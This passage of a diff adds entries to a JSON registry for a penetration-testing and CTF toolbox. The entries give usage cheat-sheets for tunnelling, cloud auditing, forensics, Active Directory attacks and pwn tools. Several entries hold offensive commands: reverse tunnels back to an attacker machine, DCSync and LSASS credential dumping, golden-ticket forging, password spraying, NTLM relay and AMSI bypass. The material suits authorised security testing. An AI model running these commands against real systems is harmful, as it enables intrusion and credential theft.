+    "description": "文件元数据分析 (v13.55) — 实测可用\n  /opt/homebrew/bin/exiftool\n常用:\n  exiftool file.jpg               查看所有元数据\n  exiftool -gps:all photo.jpg     查看GPS信息\n  exiftool -all= file.jpg         清除所有元数据\n  exiftool -comment='text' file   写入注释\n  exiftool -r /path/to/dir        递归处理目录",
+    "available": true
+  },
+  {
+    "id": "mobsf",
+    "name": "MobSF (移动安全)",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/mobsf-up.sh",
+    "category": "android",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "mobile",
+      "apk",
+      "docker"
+    ],
+    "description": "MobSF (Mobile Security Framework) — 移动App自动化安全分析平台\n\n通过Docker启动（需已安装Docker Desktop）:\n```\nbash ~/Workspace/security/tools/TH_Tools/tools/_launchers/mobsf-up.sh\n```\n或手动:\n```\ndocker run --rm -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n```\nWeb UI: http://localhost:8000  用户名/密码: admin / mobsf\n\n功能: APK/IPA/APPX静态+动态分析、反编译、恶意代码检测、SSL证书分析",
+    "available": true
+  },
+  {
+    "id": "chisel-http",
+    "name": "chisel (HTTP隧道)",
+    "type": "shell",
+    "path": "~/go/bin/chisel",
+    "category": "tunnel",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "tunnel",
+      "socks5"
+    ],
+    "description": "HTTP隧道工具 — 实测可用\n  ~/go/bin/chisel\n常用:\n  # 服务端(攻击机): chisel server -p 8080 --reverse\n  # 反向SOCKS5: chisel client 攻击机:8080 R:socks\n  # 端口转发: chisel client 攻击机:8080 R:3389:127.0.0.1:3389\n  # 正向SOCKS: chisel server -p 8080 --socks5\n  #           chisel client 服务端:8080 socks\n配合proxychains: proxychains4 nmap -sT -Pn 10.10.10.0/24",
+    "available": true
+  },
+  {
+    "id": "ligolo-proxy-tls",
+    "name": "ligolo-proxy (TLS隧道)",
+    "type": "shell",
+    "path": "~/.local/bin/ligolo-proxy",
+    "category": "tunnel",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "tunnel",
+      "tls",
+      "ligolo"
+    ],
+    "description": "基于TLS的内网隧道 (v0.8.3) — 实测可用\n  ~/.local/bin/ligolo-proxy\n使用步骤:\n  # 1. 攻击机启动proxy\n  ligolo-proxy -selfcert -laddr 0.0.0.0:11601\n  # 2. 靶机运行agent\n  ./agent -connect 攻击机:11601 -ignore-cert\n  # 3. proxy UI: session → ifconfig → start\n  # 4. Mac添加路由\n  sudo ifconfig lo0 alias 240.0.0.1\n  sudo route add -net 192.168.0.0/24 240.0.0.1",
+    "available": true
+  },
+  {
+    "id": "prowler",
+    "name": "Prowler (云合规)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/prowler",
+    "category": "cloud",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "aws",
+      "azure",
+      "gcp",
+      "compliance"
+    ],
+    "description": "AWS安全合规检查 (v5.24.4) — 实测可用\n  /opt/homebrew/bin/prowler\n常用:\n  prowler aws                    完整AWS审计\n  prowler aws --compliance cis_1.4_aws\n  prowler aws -s iam,s3,ec2      指定服务\n  prowler aws -f us-east-1       指定区域\n  prowler azure --cli            审计Azure",
+    "available": true
+  },
+  {
+    "id": "pacu-aws",
+    "name": "Pacu (AWS 渗透)",
+    "type": "shell",
+    "path": "~/.local/bin/pacu",
+    "category": "cloud",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "aws",
+      "exploit"
+    ],
+    "description": "AWS渗透测试框架 (v1.7.0) — 实测可用\n  ~/.local/bin/pacu\n常用:\n  pacu                         进入交互控制台\n  run iam__enum_permissions    枚举IAM权限\n  run s3__enum                 枚举S3桶\n  run ec2__enum                枚举EC2实例\n  run iam__privesc_scan        权限提升扫描\n  import_keys                  导入AWS凭证",
+    "available": true
+  },
+  {
+    "id": "scoutsuite",
+    "name": "ScoutSuite (多云审计)",
+    "type": "shell",
+    "path": "~/.local/bin/scout",
+    "category": "cloud",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "aws",
+      "azure",
+      "gcp"
+    ],
+    "description": "多云安全审计 (v5.14.0) — 实测可用\n  ~/.local/bin/scout\n常用:\n  scout aws                      审计AWS\n  scout azure --cli              审计Azure\n  scout gcp --project <proj>     审计GCP\n  scout aws --regions us-east-1  指定区域\n报告位置: scoutsuite-report/ 目录",
+    "available": true
+  },
+  {
+    "id": "trivy-iac",
+    "name": "Trivy (容器/IaC扫描)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/trivy",
+    "category": "cloud",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "container",
+      "k8s",
+      "iac"
+    ],
+    "description": "容器/IaC/代码漏洞扫描 (v0.70.0) — 实测可用\n  /opt/homebrew/bin/trivy\n常用:\n  trivy image nginx:latest          扫描Docker镜像\n  trivy fs /path/to/code            扫描代码目录\n  trivy k8s --report=all cluster    扫描K8s集群\n  trivy config terraform/           扫描Terraform IaC\n  trivy image --severity CRITICAL nginx:latest",
+    "available": true
+  },
+  {
+    "id": "volatility-3",
+    "name": "Volatility 3 (内存取证)",
+    "type": "shell",
+    "path": "~/.local/bin/vol",
+    "category": "forensics",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "memory",
+      "forensics"
+    ],
+    "description": "内存取证分析框架 — 实测可用\n  ~/.local/bin/vol\n常用:\n  vol -f mem.dmp windows.info            基本信息\n  vol -f mem.dmp windows.pslist          进程列表\n  vol -f mem.dmp windows.cmdline         命令行\n  vol -f mem.dmp windows.netscan         网络连接\n  vol -f mem.dmp windows.malfind         可疑代码\n  vol -f mem.dmp windows.dumpfiles --pid 1234",
+    "available": true
+  },
+  {
+    "id": "sleuthkit-fls",
+    "name": "SleuthKit fls (磁盘列举)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/fls",
+    "category": "forensics",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "disk",
+      "tsk"
+    ],
+    "description": "SleuthKit The Sleuth Kit ver 4.15.0 — 磁盘文件系统分析\n常用命令:\n  fls -r image.dd                     # 列出所有文件(含已删除)\n  fls -r -m '/' image.dd > body.txt   # 生成bodyfile(用于mactime)\n  fls -d image.dd                     # 只显示已删除文件\n  icat image.dd inode > recovered     # 按inode提取文件内容\n  tsk_recover -e image.dd /output/    # 批量恢复已删除文件",
+    "available": true
+  },
+  {
+    "id": "sleuthkit-icat",
+    "name": "SleuthKit icat (恢复文件)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/icat",
+    "category": "forensics",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "disk",
+      "tsk"
+    ],
+    "description": "icat磁盘镜像文件内容提取，按inode恢复删除文件\n用法:\n  icat <image.dd> <inode>     (提取指定inode文件内容)\n  # 配合fls使用:\n  fls -r disk.img | grep '\\*' (列出删除文件)\n  icat disk.img 12345 > recovered.file (按inode恢复)",
+    "available": true
+  },
+  {
+    "id": "tsk-recover-tsk",
+    "name": "tsk_recover (TSK 文件恢复)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/tsk_recover",
+    "category": "forensics",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "disk",
+      "recover"
+    ],
+    "description": "The Sleuth Kit文件批量恢复工具\n用法:\n  tsk_recover -e disk.img output_dir/   (恢复所有文件含删除)\n  tsk_recover disk.img output_dir/      (只恢复已分配文件)\n  配合mmls/fsstat分析分区信息",
+    "available": true
+  },
+  {
+    "id": "velociraptor-dfir",
+    "name": "Velociraptor (DFIR平台)",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/ir/velociraptor",
+    "category": "forensics",
+    "env_id": null,
+    "args": "gui --datastore /tmp/velociraptor",
+    "tags": [
+      "dfir",
+      "endpoint"
+    ],
+    "description": "数字取证与事件响应平台 — 实测可用\n  ~/Workspace/security/tools/ir/velociraptor\n常用:\n  velociraptor gui --datastore /tmp/velociraptor   本地GUI\n  velociraptor artifacts collect Linux.Sys.Users\n  velociraptor artifacts list\n  velociraptor query 'SELECT * FROM pslist()'\n  velociraptor help                查看所有命令\n访问: https://127.0.0.1:8889 (admin/password)",
+    "available": true
+  },
+  {
+    "id": "cyberchef",
+    "name": "CyberChef (解密/编码)",
+    "type": "gui",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/cyberchef/CyberChef_v10.23.0.html",
+    "category": "crypto",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "cyberchef",
+      "decode",
+      "encrypt",
+      "300+ops"
+    ],
+    "description": "CyberChef在线编解码工具(本地HTML版)，The Cyber Swiss Army Knife\n用法: 浏览器打开本地HTML文件\n功能: Base64/Hex/ROT13/AES/JWT/Gzip/哈希等300+操作\nCTF必备: 多步骤数据转换，Recipe链式处理\n路径: 工具箱点击即在浏览器打开",
+    "available": true
+  },
+  {
+    "id": "feroxbuster",
+    "name": "feroxbuster (目录爆破)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/feroxbuster",
+    "category": "dir-fuzz",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "feroxbuster",
+      "dir",
+      "fuzz"
+    ],
+    "description": "递归目录爆破 (v2.13.1) — 实测可用\n  /opt/homebrew/bin/feroxbuster\n常用:\n  feroxbuster -u https://target.com -w wordlist.txt\n  feroxbuster -u https://target.com -x php,bak,zip\n  feroxbuster -u https://target.com --depth 3 --filter-status 404\n  feroxbuster -u https://t.com -w list.txt -t 50 --no-recursion",
+    "available": true
+  },
+  {
+    "id": "semgrep-sast",
+    "name": "semgrep (SAST代码审计)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/semgrep",
+    "category": "code-audit",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "semgrep",
+      "sast",
+      "audit"
+    ],
+    "description": "静态应用安全测试 (v1.157.0) — 实测可用\n  /opt/homebrew/bin/semgrep\n常用:\n  semgrep --config=auto .                 自动规则\n  semgrep --config=p/java-security .      Java安全\n  semgrep --config=p/php-security .       PHP安全\n  semgrep --config=p/owasp-top-ten .      OWASP Top10\n  semgrep --config=p/python-security .    Python安全\n  semgrep scan --error -o report.json .",
+    "available": true
+  },
+  {
+    "id": "jadx-cli",
+    "name": "jadx (反编译CLI)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/jadx",
+    "category": "android",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "jadx",
+      "android",
+      "dex"
+    ],
+    "description": "JADX命令行反编译 (v1.5.5) — 实测可用\n  /opt/homebrew/bin/jadx\n常用:\n  jadx -d output/ app.apk        反编译APK\n  jadx -r -d output/ app.apk     反编译+资源文件\n  jadx -e -d output/ app.apk     导出Gradle项目\n  jadx --show-bad-code app.apk   显示错误代码\n  jadx -d out/ --no-debug-info app.apk",
+    "available": true
+  },
+  {
+    "id": "tshark-wireshark-cli",
+    "name": "tshark (Wireshark CLI)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/tshark",
+    "category": "traffic",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "tshark",
+      "pcap",
+      "wireshark"
+    ],
+    "description": "Wireshark CLI (v4.6.4) — 实测可用\n  /opt/homebrew/bin/tshark\n常用:\n  tshark -i eth0 -w capture.pcap\n  tshark -r capture.pcap -Y 'http.request'\n  tshark -r cap.pcap -T fields -e http.host -e http.request.uri\n  tshark -r cap.pcap -Y 'tcp.port==4444' -x\n  tshark -r cap.pcap -Y 'dns' -T fields -e dns.qry.name",
+    "available": true
+  },
+  {
+    "id": "kunlun-m-php",
+    "name": "Kunlun-M (PHP代码审计)",
+    "type": "python",
+    "path": "~/Kunlun-M/kunlun.py",
+    "category": "code-audit",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "kunlun",
+      "php",
+      "audit",
+      "sast"
+    ],
+    "description": "PHP/JS/Go代码审计SAST框架，污点分析检测SQLi/XSS/RCE/文件包含\n用法:\n  python3 kunlun.py init                              (初始化数据库)\n  python3 kunlun.py scan -t /path/to/code            (扫描目录)\n  python3 kunlun.py scan -t /path/to/code -l php     (指定语言)\n  python3 kunlun.py web                               (启动Web界面 :9999)\n  python3 kunlun.py show -v <scan_id>                (查看扫描结果)",
+    "available": true
+  },
+  {
+    "id": "frida",
+    "name": "frida (动态插桩)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/frida",
+    "category": "android",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "frida",
+      "hook",
+      "android",
+      "ios"
+    ],
+    "description": "动态插桩框架 (v17.9.1) — 实测可用\n  /opt/homebrew/bin/frida\n常用:\n  frida -U -f com.app.package -l hook.js   USB spawn\n  frida -U -n AppName -l script.js          附加运行中App\n  frida-ps -U                               列出USB设备进程\n  frida-trace -U -f com.app -m 'Java.perform*'\n  frida -U -f com.app -l ssl_bypass.js      SSL Pinning bypass",
+    "available": true
+  },
+  {
+    "id": "objection",
+    "name": "objection (运行时探测)",
+    "type": "shell",
+    "path": "~/.local/bin/objection",
+    "category": "android",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "objection",
+      "frida",
+      "ssl-pinning",
+      "android"
+    ],
+    "description": "基于Frida的安卓运行时探测 — 实测可用\n  ~/.local/bin/objection\n常用:\n  objection -g com.app.package explore\n  # objection shell内:\n  android sslpinning disable      绕过SSL Pinning\n  android root disable            绕过Root检测\n  android hooking list activities 列出Activity\n  memory dump all mem.dmp         内存dump",
+    "available": true
+  },
+  {
+    "id": "gef-gdb",
+    "name": "GEF (GDB增强)",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/gef-shell.sh",
+    "category": "reverse",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "gdb",
+      "gef",
+      "pwn",
+      "debug"
+    ],
+    "description": "GEF - GDB Enhanced Features，CTF PWN调试必备\n用法:\n  gdb -x /path/to/gef.py ./binary      (加载GEF)\n  # GEF内置命令:\n  checksec       (安全属性)\n  vmmap          (内存映射)\n  heap chunks    (堆块查看)\n  pattern create 200  (生成cyclic pattern)\n  pattern offset $rsp (计算偏移)\n  rop            (ROP gadget搜索)",
+    "available": true
+  },
+  {
+    "id": "ropgadget-rop",
+    "name": "ROPgadget (ROP链)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/ROPgadget",
+    "category": "pwn",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "rop",
+      "pwn",
+      "exploit"
+    ],
+    "description": "ROP gadget搜索 (v7.7) — 实测可用\n  /opt/homebrew/bin/ROPgadget\n常用:\n  ROPgadget --binary ./target --rop\n  ROPgadget --binary ./target --string '/bin/sh'\n  ROPgadget --binary ./target --rop | grep 'pop rdi'\n  ROPgadget --binary libc.so.6 --rop > gadgets.txt\n  ROPgadget --binary ./target --ret",
+    "available": true
+  },
+  {
+    "id": "xray",
+    "name": "xray (被动扫描)",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/scanner/xray/xray_darwin_arm64",
+    "category": "vuln-scan",
+    "env_id": null,
+    "args": "webscan --listen 127.0.0.1:17777 --html-output xray_report.html",
+    "tags": [
+      "xray",
+      "passive",
+      "scan"
+    ],
+    "description": "xray被动扫描器 — 实测可用\n  ~/Workspace/security/tools/scanner/xray/xray_darwin_arm64\n常用:\n  xray_darwin_arm64 webscan --listen 127.0.0.1:17777 --html-output report.html\n  xray_darwin_arm64 webscan --url https://target.com --html-output report.html\n  xray_darwin_arm64 webscan --listen 127.0.0.1:17777 --json-output out.json\nBurp联动: User Options → Upstream Proxy → 127.0.0.1:17777",
+    "available": true
+  },
+  {
+    "id": "xpoc-poc",
+    "name": "xpoc (POC扫描)",
+    "type": "shell",
+    "path": "/usr/local/bin/xpoc",
+    "category": "vuln-scan",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "xpoc",
+      "poc",
+      "scan"
+    ],
+    "description": "xpoc快速POC验证工具(长亭科技)\n用法:\n  xpoc -t http://target -p poc.yml      (单POC验证)\n  xpoc -t targets.txt                   (批量目标)\n  xpoc --list                           (列出内置POC)",
+    "available": true
+  },
+  {
+    "id": "pspy",
+    "name": "pspy (进程监控静态包)",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/pspy-finder.sh",
+    "category": "post-exploit",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "pspy",
+      "process",
+      "privesc",
+      "linux"
+    ],
+    "description": "pspy无需root的Linux进程监控，发现定时任务和敏感操作\n用法:\n  # 上传到目标Linux机器后:\n  chmod +x pspy64 && ./pspy64           (64位Linux)\n  chmod +x pspy32 && ./pspy32           (32位Linux)\n  ./pspy64 -pf -i 1000                 (监控文件+进程，1秒间隔)\n  # 工具箱打开静态二进制目录，选择对应架构版本上传",
+    "available": true
+  },
+  {
+    "id": "jd-gui-java",
+    "name": "JD-GUI (Java反编译)",
+    "type": "gui",
+    "path": "/Applications/JD-GUI.app",
+    "category": "reverse",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "java",
+      "decompile",
+      "class",
+      "jar"
+    ],
+    "description": "JD-GUI Java字节码反编译器图形界面\n用法: 拖入JAR/CLASS文件查看Java源码\n功能: 导出源码/搜索/类层次\n配合: jadx-gui(Android APK)、Procyon(更高精度反编译)",
+    "available": true
+  },
+  {
+    "id": "lm-studio",
+    "name": "LM Studio (本地大模型)",
+    "type": "gui",
+    "path": "/Applications/LM Studio.app",
+    "category": "other",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "llm",
+      "local",
+      "ai"
+    ],
+    "description": "LM Studio本地大语言模型运行环境\n用法: 下载GGUF格式模型，本地运行LLM\n提供: OpenAI兼容API接口(http://localhost:1234/v1)\n用途: 无网络环境AI辅助/CTF AI题目分析",
+    "available": true
+  },
+  {
+    "id": "vmware-fusion",
+    "name": "VMware Fusion (虚拟机)",
+    "type": "gui",
+    "path": "/Applications/VMware Fusion.app",
+    "category": "other",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "vm",
+      "vmware",
+      "kali"
+    ],
+    "description": "VMware Fusion — macOS虚拟机平台\n\n双击启动 /Applications/VMware Fusion.app\n\n渗透测试用途:\n- 运行Kali Linux攻击机\n- 隔离运行Windows靶机/恶意样本\n- 搭建内网域环境（DC+成员机）\n\n推荐虚拟机: Kali 2024.x (官方ARM镜像) + Windows Server 2019\n下载: https://www.vmware.com/products/desktop-hypervisor.html",
+    "available": true
+  },
+  {
+    "id": "impacket",
+    "name": "Impacket 工具集 (域渗透)",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/post-ex/hengxiang/impacket-0.11.0/run_impacket.sh",
+    "category": "lateral",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "impacket",
+      "secretsdump",
+      "psexec",
+      "wmiexec",
+      "kerberos",
+      "ad"
+    ],
+    "description": "Impacket域渗透工具集(Python实现SMB/Kerberos/LDAP协议栈)\n用法:\n  secretsdump.py domain/user:pass@dc-ip          (抓哈希/DCSync)\n  psexec.py domain/user:pass@target              (SMB命令执行)\n  wmiexec.py domain/user:pass@target 'whoami'    (WMI执行)\n  GetUserSPNs.py domain/user:pass -dc-ip ip -request  (Kerberoasting)\n  GetNPUsers.py domain/ -usersfile users.txt -dc-ip ip (AS-REP Roasting)\n  ntlmrelayx.py -tf targets.txt -smb2support    (NTLM中继)\n  ticketer.py -nthash <krbtgt> -domain-sid <SID> -domain domain.local Administrator (黄金票据)\n  工具路径: ~/Workspace/security/tools/TH_Tools/tools/post-ex/hengxiang/impacket-0.11.0/examples/",
+    "available": true
+  },
+  {
+    "id": "pypykatz-python-mimikatz",
+    "name": "pypykatz (Python Mimikatz)",
+    "type": "shell",
+    "path": "~/.local/bin/pypykatz",
+    "category": "domain-cred",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "mimikatz",
+      "lsass",
+      "ntlm",
+      "credential",
+      "ad"
+    ],
+    "description": "纯Python Mimikatz (凭证提取) — 实测可用\n  ~/.local/bin/pypykatz\n常用:\n  pypykatz lsa minidump lsass.dmp       分析内存dump\n  pypykatz registry --sam SAM --system SYSTEM  离线注册表\n  pypykatz lsa smb <target> -u admin -p pass   远程提取\n  pypykatz lsa minidump lsass.dmp -o json > creds.json",
+    "available": true
+  },
+  {
+    "id": "bloodhound-py-ad",
+    "name": "BloodHound.py (AD信息收集)",
+    "type": "shell",
+    "path": "~/.local/bin/bloodhound-python",
+    "category": "domain-enum",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "bloodhound",
+      "ad",
+      "graph",
+      "acl",
+      "kerberos"
+    ],
+    "description": "AD域信息收集 (v1.7+) — 实测可用\n  ~/.local/bin/bloodhound-python\n常用:\n  bloodhound-python -d corp.local -u user -p pass -c all -ns <dc>\n  bloodhound-python -d corp.local -u user -p pass -c DCOnly\n  bloodhound-python -d corp.local --auth-method kerberos -k\n  bloodhound-python -d corp.local -u user -p pass -c all --zip\n采集后: 导入 BloodHound 或 BloodHound CE 分析攻击路径",
+    "available": true
+  },
+  {
+    "id": "kerbrute-kerberos",
+    "name": "kerbrute (Kerberos爆破)",
+    "type": "shell",
+    "path": "~/go/bin/kerbrute",
+    "category": "domain-atk",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "kerberos",
+      "brute",
+      "user enum",
+      "ad"
+    ],
+    "description": "Kerberos用户枚举/密码喷洒 — 实测可用\n  ~/go/bin/kerbrute\n常用:\n  kerbrute userenum -d corp.local --dc <dc-ip> users.txt\n  kerbrute passwordspray -d corp.local --dc <dc> users.txt 'Pass@123'\n  kerbrute bruteuser -d corp.local --dc <dc> admin pass.txt\n  kerbrute userenum -d corp.local --dc <dc> /usr/share/seclists/Usernames/...",
+    "available": true
+  },
+  {
+    "id": "evil-winrm-winrm-shell",
+    "name": "evil-winrm (WinRM Shell)",
+    "type": "shell",
+    "path": "~/.local/bin/evil-winrm",
+    "category": "lateral",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "winrm",
+      "shell",
+      "windows",
+      "ad"
+    ],
+    "description": "Windows远程管理Shell — 实测可用\n  ~/.local/bin/evil-winrm\n常用:\n  evil-winrm -i <target> -u admin -p 'pass'\n  evil-winrm -i <target> -u admin -H <ntlm-hash>\n  evil-winrm -i <target> -u admin -p pass -s scripts/\n  evil-winrm -i <target> -u admin -p pass -e executables/\n内置功能: upload/download, bypass AMSI, bypass ETW, Invoke-Binary",
+    "available": true
+  },
+  {
+    "id": "searchsploit",
+    "name": "searchsploit (离线漏洞库)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/searchsploit",
+    "category": "privesc-linux",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "exploitdb",
+      "cve",
+      "offline",
+      "poc"
+    ],
+    "description": "ExploitDB离线漏洞搜索 — 实测可用\n  /opt/homebrew/bin/searchsploit\n常用:\n  searchsploit linux kernel 5.4\n  searchsploit -x 45010          查看exp代码\n  searchsploit -m 45010          复制exp到当前目录\n  searchsploit --nmap scan.xml   根据nmap结果搜索\n  searchsploit apache 2.4 rce",
+    "available": true
+  },
+  {
+    "id": "one-gadget-getshell",
+    "name": "one_gadget (一键GetShell)",
+    "type": "shell",
+    "path": "~/.local/bin/one_gadget",
+    "category": "pwn",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "pwn",
+      "libc",
+      "gadget",
+      "rop",
+      "ctf"
+    ],
+    "description": "libc一键getshell gadget (v1.10.0) — 实测可用\n  ~/.local/bin/one_gadget\n常用:\n  one_gadget /lib/x86_64-linux-gnu/libc.so.6\n  one_gadget libc.so.6 -l 2       更多备选gadget\n  one_gadget libc.so.6 -b 0x1234  指定基址\n  one_gadget libc-2.35.so --info",
+    "available": true
+  },
+  {
+    "id": "seccomp-tools",
+    "name": "seccomp-tools (沙箱分析)",
+    "type": "shell",
+    "path": "~/.local/bin/seccomp-tools",
+    "category": "pwn",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "seccomp",
+      "sandbox",
+      "syscall",
+      "pwn",
+      "ctf"
+    ],
+    "description": "seccomp沙箱分析 (v1.6.2) — 实测可用\n  ~/.local/bin/seccomp-tools\n常用:\n  seccomp-tools dump ./target     运行并提取seccomp规则\n  seccomp-tools disasm dump.bin   反汇编规则\n  seccomp-tools asm rules.s       汇编规则\n  seccomp-tools detect ./target",
+    "available": true
+  },
+  {
+    "id": "pwntools-ctf",
+    "name": "pwntools (CTF利用框架)",
+    "type": "shell",
+    "path": "~/.local/bin/pwn",
+    "category": "pwn",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "pwn",
+      "exploit",
+      "rop",
+      "heap",
+      "ctf"
+    ],
+    "description": "PWN利用开发框架 (v4.15.0) — 实测可用\n  ~/.local/bin/pwn\n常用:\n  pwn checksec ./binary          检查保护\n  pwn cyclic 200                 生成cyclic串\n  pwn cyclic -l 0x6161616c       找offset\n  pwn disasm '<shellcode_hex>'\n  python3 -c 'from pwn import *; p=process(\"./bin\"); p.interactive()'",
+    "available": true
+  },
+  {
+    "id": "jwt-tool-jwt",
+    "name": "jwt_tool (JWT安全测试)",
+    "type": "python",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/web/jwt_tool/jwt_tool.py",
+    "category": "web-bypass",
+    "env_id": "py-brew-3-12",
+    "args": "",
+    "tags": [
+      "jwt",
+      "token",
+      "auth",
+      "web",
+      "ctf"
+    ],
+    "description": "JWT安全测试工具 — 实测可用\n  ~/.local/bin/jwt_tool (bash wrapper)\n  实际脚本: ~/Workspace/.../TH_Tools/tools/web/jwt_tool/jwt_tool.py\n常用:\n  jwt_tool <token>               解码分析\n  jwt_tool <token> -T            篡改测试\n  jwt_tool <token> -C -d wordlist.txt  爆破secret\n  jwt_tool <token> -X a          alg:none攻击\n  jwt_tool <token> -X s          Sign混淆攻击",
+    "available": true
+  },
+  {
+    "id": "byp4xx-403-401",
+    "name": "byp4xx (403/401绕过)",
+    "type": "shell",
+    "path": "~/go/bin/byp4xx",
+    "category": "web-bypass",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "403",
+      "bypass",
+      "path",
+      "web",
+      "ctf"
+    ],
+    "description": "403/401/40x状态码绕过 — 实测可用\n  ~/go/bin/byp4xx\n常用:\n  byp4xx https://target.com/forbidden-path\n  byp4xx -X POST https://target.com/admin\n  byp4xx -H 'X-Forwarded-For: 127.0.0.1' https://t.com/admin\n  byp4xx https://t.com/secret -r  重定向跟随",
+    "available": true
+  },
+  {
+    "id": "ghidra-nsa",
+    "name": "Ghidra (NSA反编译器)",
+    "type": "gui",
+    "path": "/Applications/ghidra.app",
+    "category": "reverse",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "ghidra",
+      "decompile",
+      "re",
+      "ctf",
+      "nsa"
+    ],
+    "description": "Ghidra NSA开源逆向工程框架\n用法:\n  创建Project > Import File > 分析二进制\n  Decompiler: F双击函数查看伪代码\n  Script Manager: 运行Python/Java分析脚本\n  CTF: 静态分析+动态调试配合GDB使用",
+    "available": true
+  },
+  {
+    "id": "ai-python",
+    "name": "AI安全对抗样本 (Python)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/python3",
+    "category": "other",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "ai",
+      "adversarial",
+      "ml",
+      "ctf",
+      "pytorch"
+    ],
+    "description": "AI对抗样本生成和防御工具集(针对AI赛题)\n用法:\n  # 图像对抗样本:\n  python3 attack.py --model model.pt --image input.jpg --output adv.jpg\n  # 常用攻击: FGSM/PGD/C&W/AutoAttack\n  # 黑盒攻击: Square Attack/HopSkipJump\n  用于CTF AI方向: 对抗样本生成、模型窃取、后门检测",
+    "available": true
+  },
+  {
+    "id": "fscan",
+    "name": "fscan (内网扫描)",
+    "type": "shell",
+    "path": "~/go/bin/fscan",
+    "category": "intranet-scan",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "fscan",
+      "intranet",
+      "scan",
+      "portscan",
+      "vuln"
+    ],
+    "description": "内网综合扫描器，存活探测+端口扫描+漏洞检测+爆破一体化\n用法:\n  fscan -h 192.168.1.0/24                  (C段全扫: 存活+端口+漏洞)\n  fscan -h 192.168.1.0/24 -p 80,443,8080  (指定端口)\n  fscan -h 192.168.1.1-254 -o result.txt  (结果输出)\n  fscan -h 192.168.1.0/24 -m ms17010      (指定模块)\n  fscan -h 192.168.1.0/24 --np --nobr     (不Ping不爆破,安静模式)\n  fscan -h 192.168.1.0/24 -pf poc/        (自定义POC目录)\n上传到Linux目标:\n  chmod +x fscan_linux_amd64 && ./fscan_linux_amd64 -h 10.0.0.0/24\n  静态二进制位于: ~/Workspace/security/tools/static-bins/fscan/",
+    "available": true
+  },
+  {
+    "id": "ssh",
+    "name": "SSH隧道 (内网穿透)",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/ssh-tunnel-shell.sh",
+    "category": "tunnel",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "ssh",
+      "tunnel",
+      "socks5",
+      "proxy",
+      "pivot"
+    ],
+    "description": "SSH动态端口转发，Mac访问内网Web最快方案\n用法:\n  ssh -D 1080 -N user@跳板IP              (SOCKS5代理,最常用)\n  ssh -D 1080 -fNq -C user@跳板IP        (后台静默压缩)\n  ssh -L 8080:内网IP:80 user@跳板IP      (本地端口转发,访问指定服务)\n  ssh -J 跳板1 user@最终目标              (多级跳转)\nMac配置代理:\n  系统设置 > 网络 > 代理 > SOCKS: 127.0.0.1:1080\n  或: export ALL_PROXY=socks5://127.0.0.1:1080\n  或: 浏览器SwitchyOmega配置SOCKS5代理",
+    "available": true
+  },
+  {
+    "id": "gost",
+    "name": "gost (多协议隧道)",
+    "type": "shell",
+    "path": "~/go/bin/gost",
+    "category": "tunnel",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "gost",
+      "tunnel",
+      "socks5",
+      "proxy",
+      "relay"
+    ],
